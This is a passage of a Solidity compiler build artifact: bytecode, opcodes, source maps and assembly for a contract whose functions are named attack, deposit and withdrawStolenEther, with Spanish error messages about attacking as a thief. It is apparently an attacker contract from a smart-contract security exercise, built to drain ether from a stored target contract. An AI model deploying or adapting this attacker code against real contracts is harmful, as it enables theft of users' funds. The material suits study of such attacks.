							"object": "608060405234801561001057600080fd5b506040516106013803806106018339818101604052602081101561003357600080fd5b8101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505061056d806100946000396000f3fe6080604052600436106100385760003560e01c806324d8e86b1461004457806364dd891a1461005b578063d0e30db0146100965761003f565b3661003f57005b600080fd5b34801561005057600080fd5b506100596100a0565b005b34801561006757600080fd5b506100946004803603602081101561007e57600080fd5b81019080803590602001909291905050506100e9565b005b61009e6102a9565b005b3373ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f193505050501580156100e6573d6000803e3d6000fd5b50565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1682604051602401808281526020019150506040516020818303038152906040527f2e1a7d4d000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040518082805190602001908083835b602083106101e457805182526020820191506020810190506020830392506101c1565b6001836020036101000a0380198251168184511680821785525050505050509050019150506000604051808303816000865af19150503d8060008114610246576040519150601f19603f3d011682016040523d82523d6000602084013e61024b565b606091505b50509050806102a5576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252602a8152602001806104e0602a913960400191505060405180910390fd5b5050565b6064341015610303576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252602e81526020018061050a602e913960400191505060405180910390fd5b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16346040516024016040516020818303038152906040527fd0e30db0000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040518082805190602001908083835b602083106103f457805182526020820191506020810190506020830392506103d1565b6001836020036101000a03801982511681845116808217855250505050505090500191505060006040518083038185875af1925050503d8060008114610456576040519150601f19603f3d011682016040523d82523d6000602084013e61045b565b606091505b50509050806104b5576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260278152602001806104b96027913960400191505060405180910390fd5b5056fe4e6f2068616269646f20657869746f2061206c6120686f7261206465206465706f73697461722e456e63696d61206465206c616472c3b36e20736f7920746f6e746f2079206e6f20736520617461636172486173206465706f73697461646f20756e612063616e74696461642064656d61736961646f207065717565c3b161a2646970667358221220b35da691a1c2d37c667fcd099efdb3e5f550fb23ab55e8c96d5ca43c2fb5f65264736f6c63430006040033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x601 CODESIZE SUB DUP1 PUSH2 0x601 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x33 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x56D DUP1 PUSH2 0x94 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x38 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x24D8E86B EQ PUSH2 0x44 JUMPI DUP1 PUSH4 0x64DD891A EQ PUSH2 0x5B JUMPI DUP1 PUSH4 0xD0E30DB0 EQ PUSH2 0x96 JUMPI PUSH2 0x3F JUMP JUMPDEST CALLDATASIZE PUSH2 0x3F JUMPI STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x50 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x59 PUSH2 0xA0 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x67 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x94 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x7E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0xE9 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x9E PUSH2 0x2A9 JUMP JUMPDEST STOP JUMPDEST CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0xE6 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH1 0x40 MLOAD PUSH1 0x24 ADD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH32 0x2E1A7D4D00000000000000000000000000000000000000000000000000000000 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x20 DUP3 ADD DUP1 MLOAD PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP4 DUP2 DUP4 AND OR DUP4 MSTORE POP POP POP POP PUSH1 0x40 MLOAD DUP1 DUP3 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x1E4 JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x1C1 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP7 GAS CALL SWAP2 POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x246 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x24B JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP DUP1 PUSH2 0x2A5 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x2A DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x4E0 PUSH1 0x2A SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP POP JUMP JUMPDEST PUSH1 0x64 CALLVALUE LT ISZERO PUSH2 0x303 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x2E DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x50A PUSH1 0x2E SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLVALUE PUSH1 0x40 MLOAD PUSH1 0x24 ADD PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH32 0xD0E30DB000000000000000000000000000000000000000000000000000000000 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x20 DUP3 ADD DUP1 MLOAD PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP4 DUP2 DUP4 AND OR DUP4 MSTORE POP POP POP POP PUSH1 0x40 MLOAD DUP1 DUP3 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x3F4 JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x3D1 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP8 GAS CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x456 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x45B JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP DUP1 PUSH2 0x4B5 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x27 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x4B9 PUSH1 0x27 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP JUMP INVALID 0x4E PUSH16 0x2068616269646F20657869746F206120 PUSH13 0x6120686F726120646520646570 PUSH16 0x73697461722E456E63696D6120646520 PUSH13 0x616472C3B36E20736F7920746F PUSH15 0x746F2079206E6F2073652061746163 PUSH2 0x7248 PUSH2 0x7320 PUSH5 0x65706F7369 PUSH21 0x61646F20756E612063616E74696461642064656D61 PUSH20 0x6961646F207065717565C3B161A2646970667358 0x22 SLT KECCAK256 0xB3 0x5D 0xA6 SWAP2 LOG1 0xC2 0xD3 PUSH29 0x667FCD099EFDB3E5F550FB23AB55E8C96D5CA43C2FB5F65264736F6C63 NUMBER STOP MOD DIV STOP CALLER ",
							"sourceMap": "7813:1031:0:-:0;;;7940:122;5:9:-1;2:2;;;27:1;24;17:12;2:2;7940:122:0;;;;;;;;;;;;;;;15:2:-1;10:3;7:11;4:2;;;31:1;28;21:12;4:2;7940:122:0;;;;;;;;;;;;;;;;8010:11;7991:16;;:30;;;;;;;;;;;;;;;;;;7940:122;7813:1031;;;;;;"
						},
						"deployedBytecode": {
							"linkReferences": {},
							"object": "6080604052600436106100385760003560e01c806324d8e86b1461004457806364dd891a1461005b578063d0e30db0146100965761003f565b3661003f57005b600080fd5b34801561005057600080fd5b506100596100a0565b005b34801561006757600080fd5b506100946004803603602081101561007e57600080fd5b81019080803590602001909291905050506100e9565b005b61009e6102a9565b005b3373ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f193505050501580156100e6573d6000803e3d6000fd5b50565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1682604051602401808281526020019150506040516020818303038152906040527f2e1a7d4d000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040518082805190602001908083835b602083106101e457805182526020820191506020810190506020830392506101c1565b6001836020036101000a0380198251168184511680821785525050505050509050019150506000604051808303816000865af19150503d8060008114610246576040519150601f19603f3d011682016040523d82523d6000602084013e61024b565b606091505b50509050806102a5576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252602a8152602001806104e0602a913960400191505060405180910390fd5b5050565b6064341015610303576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252602e81526020018061050a602e913960400191505060405180910390fd5b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16346040516024016040516020818303038152906040527fd0e30db0000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040518082805190602001908083835b602083106103f457805182526020820191506020810190506020830392506103d1565b6001836020036101000a03801982511681845116808217855250505050505090500191505060006040518083038185875af1925050503d8060008114610456576040519150601f19603f3d011682016040523d82523d6000602084013e61045b565b606091505b50509050806104b5576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260278152602001806104b96027913960400191505060405180910390fd5b5056fe4e6f2068616269646f20657869746f2061206c6120686f7261206465206465706f73697461722e456e63696d61206465206c616472c3b36e20736f7920746f6e746f2079206e6f20736520617461636172486173206465706f73697461646f20756e612063616e74696461642064656d61736961646f207065717565c3b161a2646970667358221220b35da691a1c2d37c667fcd099efdb3e5f550fb23ab55e8c96d5ca43c2fb5f65264736f6c63430006040033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x38 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x24D8E86B EQ PUSH2 0x44 JUMPI DUP1 PUSH4 0x64DD891A EQ PUSH2 0x5B JUMPI DUP1 PUSH4 0xD0E30DB0 EQ PUSH2 0x96 JUMPI PUSH2 0x3F JUMP JUMPDEST CALLDATASIZE PUSH2 0x3F JUMPI STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x50 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x59 PUSH2 0xA0 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x67 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x94 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x7E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0xE9 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x9E PUSH2 0x2A9 JUMP JUMPDEST STOP JUMPDEST CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0xE6 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH1 0x40 MLOAD PUSH1 0x24 ADD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH32 0x2E1A7D4D00000000000000000000000000000000000000000000000000000000 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x20 DUP3 ADD DUP1 MLOAD PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP4 DUP2 DUP4 AND OR DUP4 MSTORE POP POP POP POP PUSH1 0x40 MLOAD DUP1 DUP3 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x1E4 JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x1C1 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP7 GAS CALL SWAP2 POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x246 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x24B JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP DUP1 PUSH2 0x2A5 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x2A DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x4E0 PUSH1 0x2A SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP POP JUMP JUMPDEST PUSH1 0x64 CALLVALUE LT ISZERO PUSH2 0x303 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x2E DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x50A PUSH1 0x2E SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLVALUE PUSH1 0x40 MLOAD PUSH1 0x24 ADD PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH32 0xD0E30DB000000000000000000000000000000000000000000000000000000000 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x20 DUP3 ADD DUP1 MLOAD PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP4 DUP2 DUP4 AND OR DUP4 MSTORE POP POP POP POP PUSH1 0x40 MLOAD DUP1 DUP3 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x3F4 JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x3D1 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP8 GAS CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x456 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x45B JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP DUP1 PUSH2 0x4B5 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x27 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x4B9 PUSH1 0x27 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP JUMP INVALID 0x4E PUSH16 0x2068616269646F20657869746F206120 PUSH13 0x6120686F726120646520646570 PUSH16 0x73697461722E456E63696D6120646520 PUSH13 0x616472C3B36E20736F7920746F PUSH15 0x746F2079206E6F2073652061746163 PUSH2 0x7248 PUSH2 0x7320 PUSH5 0x65706F7369 PUSH21 0x61646F20756E612063616E74696461642064656D61 PUSH20 0x6961646F207065717565C3B161A2646970667358 0x22 SLT KECCAK256 0xB3 0x5D 0xA6 SWAP2 LOG1 0xC2 0xD3 PUSH29 0x667FCD099EFDB3E5F550FB23AB55E8C96D5CA43C2FB5F65264736F6C63 NUMBER STOP MOD DIV STOP CALLER ",
							"sourceMap": "7813:1031:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;12:1:-1;9;2:12;8699:100:0;;5:9:-1;2:2;;;27:1;24;17:12;2:2;8699:100:0;;;:::i;:::-;;8383:307;;5:9:-1;2:2;;;27:1;24;17:12;2:2;8383:307:0;;;;;;15:2:-1;10:3;7:11;4:2;;;31:1;28;21:12;4:2;8383:307:0;;;;;;;;;;;;;;;;;:::i;:::-;;8070:305;;;:::i;:::-;;8699:100;8749:10;:19;;:42;8769:21;8749:42;;;;;;;;;;;;;;;;;;;;;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;8749:42:0;8699:100::o;8383:307::-;8516:12;8532:16;;;;;;;;;;;:21;;8599:8;8554:54;;;;;;;;;;;;;;;49:4:-1;39:7;30;26:21;22:32;13:7;6:49;8554:54:0;;;;;;;38:4:-1;29:7;25:18;67:10;61:17;96:58;199:8;192:4;186;182:15;179:29;167:10;160:49;0:215;;;8554:54:0;8532:77;;;;;;;;;;;;;36:153:-1;66:2;61:3;58:11;36:153;;182:3;176:10;171:3;164:23;98:2;93:3;89:12;82:19;;123:2;118:3;114:12;107:19;;148:2;143:3;139:12;132:19;;36:153;;;274:1;267:3;263:2;259:12;254:3;250:22;246:30;315:4;311:9;305:3;299:10;295:26;356:4;350:3;344:10;340:21;389:7;380;377:20;372:3;365:33;3:399;;;8532:77:0;;;;;;;;;;;;;;;;;;;;;;;;12:1:-1;19;14:27;;;;67:4;61:11;56:16;;134:4;130:9;123:4;105:16;101:27;97:43;94:1;90:51;84:4;77:65;157:16;154:1;147:27;211:16;208:1;201:4;198:1;194:12;179:49;5:228;;14:27;32:4;27:9;;5:228;;8515:94:0;;;8628:7;8620:62;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;8383:307;;:::o;8070:305::-;8137:3;8125:9;:15;;8117:74;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;8205:12;8221:16;;;;;;;;;;;:21;;8249:9;8260:36;;;;;;49:4:-1;39:7;30;26:21;22:32;13:7;6:49;8260:36:0;;;;;;;38:4:-1;29:7;25:18;67:10;61:17;96:58;199:8;192:4;186;182:15;179:29;167:10;160:49;0:215;;;8260:36:0;8221:76;;;;;;;;;;;;;36:153:-1;66:2;61:3;58:11;36:153;;182:3;176:10;171:3;164:23;98:2;93:3;89:12;82:19;;123:2;118:3;114:12;107:19;;148:2;143:3;139:12;132:19;;36:153;;;274:1;267:3;263:2;259:12;254:3;250:22;246:30;315:4;311:9;305:3;299:10;295:26;356:4;350:3;344:10;340:21;389:7;380;377:20;372:3;365:33;3:399;;;8221:76:0;;;;;;;;;;;;;;;;;;;;;;;;;12:1:-1;19;14:27;;;;67:4;61:11;56:16;;134:4;130:9;123:4;105:16;101:27;97:43;94:1;90:51;84:4;77:65;157:16;154:1;147:27;211:16;208:1;201:4;198:1;194:12;179:49;5:228;;14:27;32:4;27:9;;5:228;;8204:93:0;;;8316:7;8308:59;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;8070:305;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "277800",
								"executionCost": "infinite",
								"totalCost": "infinite"
							},
							"external": {
								"attack(uint256)": "infinite",
								"deposit()": "infinite",
								"withdrawStolenEther()": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 7813,
									"end": 8844,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 7813,
									"end": 8844,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 7813,
									"end": 8844,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 7940,
									"end": 8062,
									"name": "CALLVALUE",
									"source": 0
								},
								{
									"begin": 5,
									"end": 14,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 2,
									"end": 4,
									"name": "ISZERO",
									"source": -1
								},
								{
									"begin": 2,
									"end": 4,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "1"
								},
								{
									"begin": 2,
									"end": 4,
									"name": "JUMPI",
									"source": -1
								},
								{
									"begin": 27,
									"end": 28,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 24,
									"end": 25,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 17,
									"end": 29,
									"name": "REVERT",
									"source": -1
								},
								{
									"begin": 2,
									"end": 4,
									"name": "tag",
									"source": -1,
									"value": "1"
								},
								{
									"begin": 2,
									"end": 4,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 7940,
									"end": 8062,
									"name": "POP",
